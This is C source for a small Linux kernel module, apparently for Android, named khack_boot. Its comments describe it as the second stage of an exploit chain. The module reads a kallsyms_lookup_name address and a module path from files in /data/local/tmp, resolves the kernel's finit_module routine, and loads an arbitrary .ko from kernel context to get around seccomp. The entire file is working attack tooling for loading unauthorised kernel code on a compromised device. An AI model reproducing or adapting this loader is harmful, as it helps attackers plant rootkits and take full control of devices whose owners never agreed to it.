/*
 * khack_boot - two-stage module loader.
 *
 * The exploit chain can only carry a module of roughly 9 KB into the
 * page-cache slot, which is too small for the real driver.  This module is
 * deliberately tiny: it reads two files prepared by userspace and loads the
 * module named in the second one from kernel context, where no seccomp filter
 * exists.
 *
 *   /data/local/tmp/kl_addr   "0xffffffc0xxxxxxxx"  address of
 *                             kallsyms_lookup_name (root reads /proc/kallsyms)
 *   /data/local/tmp/kl_path   "/data/local/tmp/whatever.ko"
 *
 * Nothing is parsed in kernel space: reading /proc/kallsyms through
 * kernel_read() crashes because it is a seq_file, so the address is resolved
 * by userspace and handed over as plain text.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/vmalloc.h>
#include <linux/string.h>

#define ADDR_FILE "/data/local/tmp/kl_addr"
#define PATH_FILE "/data/local/tmp/kl_path"

typedef unsigned long (*klname_fn)(const char *);
typedef int (*finit_fn)(int fd, const void __user *uargs, int flags);

/* Read a small text file into buf (NUL terminated).  Returns length or <0. */
static int read_small(const char *path, char *buf, int size)
{
	struct file *f;
	ssize_t n;

	f = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);
	n = kernel_read(f, buf, size - 1, &f->f_pos);
	filp_close(f, NULL);
	if (n <= 0)
		return n < 0 ? (int)n : -EINVAL;
	buf[n] = 0;
	while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
		buf[--n] = 0;
	return (int)n;
}

static int __init khack_boot_init(void)
{
	char addr_buf[32];
	char path[256];
	char *end;
	unsigned long addr;
	klname_fn klname;
	finit_fn finit;
	struct file *f;
	int fd, ret;

	ret = read_small(ADDR_FILE, addr_buf, sizeof(addr_buf));
	if (ret <= 0) {
		pr_err("khack_boot: cannot read " ADDR_FILE ": %d\n", ret);
		return ret < 0 ? ret : -EINVAL;
	}
	addr = simple_strtoul(addr_buf, &end, 0);
	if (!addr) {
		pr_err("khack_boot: bad address '%s'\n", addr_buf);
		return -EINVAL;
	}

	ret = read_small(PATH_FILE, path, sizeof(path));
	if (ret <= 0) {
		pr_err("khack_boot: cannot read " PATH_FILE ": %d\n", ret);
		return ret < 0 ? ret : -EINVAL;
	}

	klname = (klname_fn)addr;
	finit = (finit_fn)klname("__do_sys_finit_module");
	if (!finit)
		finit = (finit_fn)klname("do_finit_module");
	if (!finit) {
		pr_err("khack_boot: finit_module not found\n");
		return -ENOSYS;
	}

	f = filp_open(path, O_RDONLY, 0);
	if (IS_ERR(f)) {
		pr_err("khack_boot: cannot open %s\n", path);
		return PTR_ERR(f);
	}
	fd = get_unused_fd_flags(O_RDONLY);
	if (fd < 0) {
		filp_close(f, NULL);
		return fd;
	}
	fd_install(fd, f);
	ret = finit(fd, NULL, 0);
	ksys_close(fd);

	pr_info("khack_boot: %s -> %d\n", path, ret);
	return ret;
}

static void __exit khack_boot_exit(void)
{
}

module_init(khack_boot_init);
module_exit(khack_boot_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("khack_boot: two-stage kernel module loader");
